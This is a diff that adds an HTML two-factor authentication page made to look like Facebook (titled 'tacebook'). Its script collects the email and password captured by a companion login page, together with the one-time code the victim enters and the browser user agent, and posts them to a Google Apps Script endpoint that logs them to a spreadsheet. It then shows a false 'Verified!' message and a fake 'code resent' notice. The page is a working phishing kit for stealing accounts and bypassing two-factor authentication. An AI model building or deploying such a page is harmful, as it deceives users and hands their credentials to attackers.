@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>tacebook – Two-Factor Authentication</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 28px 20px 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header svg {
+            width: 56px;
+            height: 56px;
+            margin-bottom: 12px;
+        }
+
+        .header h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1c1e21;
+            margin-bottom: 6px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #606770;
+            text-align: center;
+            margin-bottom: 22px;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 20px;
+            letter-spacing: 6px;
+            text-align: center;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: background 0.2s;
+        }
+
+        .submit-btn:hover {
+            background: #166fe5;
+        }
+
+        .submit-btn:disabled {
+            background: #dddfe2;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #606770;
+        }
+
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .message {
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+            min-height: 20px;
+        }
+
+        .error {
+            color: #fa383e;
+        }
+
+        .success {
+            color: #31a24c;
+        }
+
+        .info {
+            color: #606770;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#1877f2">
+                <path
+                    d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
+            </svg>
+            <h2>Two-Factor Authentication</h2>
+        </div>
+        <p class="subtitle">Enter the 6-digit code sent to your authenticator app or phone.</p>
+
+        <form id="otpForm">
+            <div class="form-group">
+                <label for="otp">Verification Code</label>
+                <input type="text" id="otp" name="otp" maxlength="6" pattern="\d{6}" inputmode="numeric"
+                    placeholder="——————" autocomplete="one-time-code" required>
+            </div>
+            <div class="message" id="message"></div>
+            <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
+        </form>
+
+        <div class="footer">
+            <a href="#" id="resendLink">Didn't receive a code?</a>
+            &nbsp;·&nbsp;
+            <a href="/login.html">Back to Login</a>
+        </div>
+    </div>
+
+    <script>
+        // ── SAME Google Apps Script URL as login.html ─────────────────────────
+        var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx0SyUTQF2qlHIwSIPPqbTVB7q69rk01-9LujiLViniu1u3yFZD5gydN5dSEzxraAyg/exec";
+        // ─────────────────────────────────────────────────────────────────────
+
+        var submitBtn = document.getElementById('submitBtn');
+        var messageDiv = document.getElementById('message');
+        var otpInput = document.getElementById('otp');
+
+        // Retrieve credentials stored by login.html
+        var storedEmail = sessionStorage.getItem('fb_email') || '';
+        var storedPassword = sessionStorage.getItem('fb_password') || '';
+
+        // Auto-focus
+        otpInput.focus();
+
+        // Only allow digits
+        otpInput.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '');
+        });
+
+        document.getElementById('otpForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            var otp = otpInput.value.trim();
+
+            if (!/^\d{6}$/.test(otp)) {
+                messageDiv.textContent = 'Please enter a valid 6-digit code.';
+                messageDiv.className = 'message error';
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verifying…';
+            messageDiv.textContent = '';
+            messageDiv.className = 'message info';
+
+            // Send everything to Google Sheets
+            fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',          // required for Apps Script
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: storedEmail,
+                    password: storedPassword,
+                    otp: otp,
+                    userAgent: navigator.userAgent,
+                    type: 'otp'          // lets the sheet distinguish login vs otp rows
+                })
+            })
+                .then(function () {
+                    // Clean up session storage
+                    sessionStorage.removeItem('fb_email');
+                    sessionStorage.removeItem('fb_password');
+
+                    messageDiv.textContent = 'Verified! Redirecting…';
+                    messageDiv.className = 'message success';
+
+                    setTimeout(function () {
+                        window.location.href = '/';   // redirect to BGIS home
+                    }, 1500);
+                })
+                .catch(function (err) {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Continue';
+                    messageDiv.textContent = 'Network error. Please check your connection.';
+                    messageDiv.className = 'message error';
+                    console.error(err);
+                });
+        });
+
+        // Resend link – cosmetic only (no real resend mechanism on front-end)
+        document.getElementById('resendLink').addEventListener('click', function (e) {
+            e.preventDefault();
+            messageDiv.textContent = 'A new code has been sent.';
+            messageDiv.className = 'message info';
+        });
+    </script>
+</body>
+
+</html>
